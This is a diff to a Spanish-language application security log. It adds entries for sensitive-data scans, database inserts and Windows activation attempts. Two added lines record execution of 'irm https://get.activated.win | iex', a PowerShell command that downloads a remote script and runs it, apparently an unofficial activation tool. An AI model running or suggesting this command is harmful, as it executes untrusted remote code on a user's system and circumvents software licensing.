@@ -2,3 +2,9 @@
 2025-09-16 17:55:04,079 - SECURITY - INFO - Operación BD INSERT: EXITOSA - 68c9eac766ac8681df46a7dc
 2025-09-16 18:00:39,121 - SECURITY - WARNING - Acceso a datos sensibles: system_scan - INCLUIDOS
 2025-09-16 18:00:46,419 - SECURITY - INFO - Operación BD INSERT: EXITOSA - 68c9ec1e46ba425386b1c59e
+2025-09-16 18:09:19,119 - SECURITY - WARNING - Acceso a datos sensibles: system_scan - INCLUIDOS
+2025-09-16 18:09:33,846 - SECURITY - INFO - Operación BD INSERT: EXITOSA - 68c9ee2d230a0d239af6a6c0
+2025-09-16 18:10:52,334 - SECURITY - WARNING - Intento de activación Windows: CONFIRMADO
+2025-09-16 18:10:52,334 - SECURITY - WARNING - Intento de activación Windows: CONFIRMADO
+2025-09-16 18:10:52,336 - SECURITY - WARNING - Comando externo EJECUTADO: irm https://get.activated.win | iex
+2025-09-16 18:10:52,336 - SECURITY - WARNING - Comando externo EJECUTADO: irm https://get.activated.win | iex
